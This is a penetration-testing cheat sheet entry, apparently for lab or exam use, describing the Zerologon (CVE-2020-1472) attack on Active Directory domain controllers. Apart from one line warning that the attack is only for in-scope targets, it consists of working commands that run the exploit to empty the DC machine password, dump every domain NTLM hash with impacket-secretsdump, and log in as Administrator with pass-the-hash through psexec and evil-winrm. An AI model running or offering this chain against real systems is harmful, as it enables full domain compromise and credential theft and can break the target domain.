---
title: Zerologon (CVE-2020-1472)
category: ad
subcategory: ad-attacks
os: linux
command: python3 cve-2020-1472-exploit.py 'DC$' DC-IP
tools: zerologon PoC, impacket-secretsdump
---


Warning: this attack can break the target domain. Only use when explicitly in scope.

### Identify target

```bash
nmap -T5 10.11.1.120 -A -v
```

Get the NetBIOS computer name and DNS name.

### Exploit (set_empty_pw)

```bash
python3 set_empty_pw.py ZERO-DC 172.31.1.29
```

### Dump hashes once exploit succeeds

```bash
secretsdump.py 'Zero.csl0/ZERO-DC$@172.31.1.29'
```

### Alternative PoC

https://github.com/dirkjanm/CVE-2020-1472

```bash
python3 cve-2020-1472-exploit.py 'SV-DC01$' 10.11.1.20
```

### Dump all hashes after success

```bash
impacket-secretsdump -just-dc-ntlm -no-pass 'svcorp/SV-DC01$@10.11.1.20'
impacket-secretsdump 'xor.com/XOR-DC01$@10.11.1.120' -just-dc-ntlm -no-pass
```

### Login with the dumped Administrator hash

```bash
psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:36242e2cb0b26d16fafd267f39ccf990 Administrator@172.31.1.29
evil-winrm -u Administrator -H 37cb630168e5f82aafa8461e05c6bbd1 -i 10.200.186.150
```
